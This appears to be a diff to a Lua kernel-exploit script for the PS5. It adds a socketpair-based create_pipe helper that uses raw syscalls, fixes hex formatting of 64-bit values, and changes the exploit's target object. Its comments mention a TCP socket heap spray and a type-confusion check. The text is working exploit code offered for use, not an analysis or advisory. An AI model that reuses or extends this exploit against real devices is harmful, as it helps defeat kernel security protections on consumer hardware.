@@ -37,8 +37,12 @@ local function to_num(v)
     return tonumber(v) or 0
 end
 local function q(v)
+    if v == nil then return "nil" end
     if type(v) == "table" and v.h then
-        return string.format("0x%08X_%08X", v.h, v.l)
+        local h, l = v.h, v.l
+        if h < 0 then h = h + 0x100000000 end
+        if l < 0 then l = l + 0x100000000 end
+        return string.format("0x%08X_%08X", h, l)
     end
     return string.format("0x%X", to_num(v))
 end
@@ -70,6 +74,21 @@ local sc_mmap = make_syscall(477)
 local sc_thr_create = make_syscall(430)
 local sc_thr_kill = make_syscall(433)
 local sc_thr_self = make_syscall(432)
+
+local function create_pipe()
+    -- pipe(2) = sys 42 returns fds via regs (rax/rdx), fcall_with_rax only gets rax.
+    -- pipe2 = sys 542 on stock FreeBSD but Sony overrides 542 as ef_wait on PS5.
+    -- Fallback: socketpair(AF_UNIX, SOCK_STREAM) — works reliably, returns via pointer.
+    -- Type confusion in Section D still detects because spray uses AF_INET TCP sockets.
+    local fds = memory.alloc(8)
+    wq(fds, uint64(0))
+    local rv = to_num(native.fcall_with_rax(stub, 135, 1, 1, 0, to_num(fds)))
+    if rv ~= 0 then
+        print("  create_pipe FAILED rv=" .. rv)
+        return 0, 0
+    end
+    return rd(fds), rd(fds + 4)
+end
 
 local F_SETFL = 4
 local O_NONBLOCK = 4
@@ -643,7 +662,7 @@ if sp ~= 0 then
 else
     native.fcall_with_rax(stub, 92, pr, F_SETFL, O_NONBLOCK)
 
-    -- Create target: a pipe (type A)
+    -- Create target: Unix socketpair (type A — distinct from AF_INET spray in type B)
     local tp1, tp2 = create_pipe()
     local pipe_fd = to_num(tp1)
     local pipe_wr = to_num(tp2)
